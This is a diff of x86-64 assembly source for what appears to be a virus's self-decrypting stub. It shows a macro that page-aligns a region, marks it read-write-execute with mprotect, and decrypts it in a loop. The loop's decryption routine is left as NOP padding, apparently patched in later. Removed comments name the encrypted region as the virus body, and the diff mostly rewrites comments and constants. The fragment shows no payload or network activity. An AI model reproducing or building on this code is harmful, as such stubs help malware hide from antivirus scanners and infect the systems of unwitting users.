@@ -2,7 +2,6 @@
 
 extern getpagesize
 extern mprotect
-; memory protection permission
 
 %define PROT_NONE  0x0
 %define PROT_READ  0x1
@@ -17,7 +16,6 @@ extern mprotect
 
 
 ; this function will take in 2 arguments
-; the address of the virus.start and the size of (virus.end - virus.start)
 %macro DECRYPTOR_SECTION 2
 ;create stack frame
 push rbp
@@ -31,22 +29,17 @@ push r15
 
 
 
-mov [rbp-0x18], rdi ; rdi is start of encrypted section
-mov [rbp-0x10], rsi ; rsi is size of section
+mov [rbp-0x18], rdi ; rdi is _START_ of section to decrypt
+mov [rbp-0x10], rsi ; rsi is _SIZE_ of section to encrypt 
 
 
 call getpagesize
-; rax has 0x1000
 mov rcx, rax
-; save rax for later use when passing to mprotect
 sub rcx, 0x1
 not rcx
 mov rdi, rdi
 mov r10, rdi
 and rdi, rcx
-; AND them and the result will be stored in rcx
-; rdi must hold the page_start address
-; mov rsi, %2      ;rsi = end
 mov r12, rdi
 mov r13, rsi 
 lea rsi, [rdi+rsi]      ;rsi = end
@@ -54,20 +47,17 @@ sub r10, rdi
 add rsi, r10
 sub rsi,rdi      ;rsi = end - aligned_start = length
 
-mov rdx, 0x7
-; read+write+exec = 0x7
+mov rdx, (PROT_READ|PROT_WRITE|PROT_EXEC)
 call mprotect
 
 
-; source - destination registers hold the start and end of virus
-; there is automatic calculation happening here which is (_start-main) == xxxh worth of memory that will be encrypted/decrypted
 mov rsi, [rbp-0x18]
 mov rdi, rsi
 add rdi, [rbp-0x10]
-
+; rdi is full address of decryption end
 
 .decryption_loop:
-	; load first 16bytes of memory data to registers
+	; load first 16h memory
 	mov eax, [rsi]
 	mov ebx, [rsi+0x4]
 	mov ecx, [rsi+0x8]
@@ -75,7 +65,6 @@ add rdi, [rbp-0x10]
 
 .decryption_function:
 	times FUNC_SIZE db OP_NOP
-	; put back the data to where it was taken from
 	mov [rsi], eax
 	mov [rsi+0x4], ebx
 	mov [rsi+0x8], ecx
@@ -87,10 +76,10 @@ add rdi, [rbp-0x10]
 	jne .decryption_loop
 
 
-
+; protect memory
 mov rdi, r12
 mov rsi, r13
-mov edx, 0x3
+mov edx, (PROT_READ|PROT_WRITE)
 call mprotect
 
 
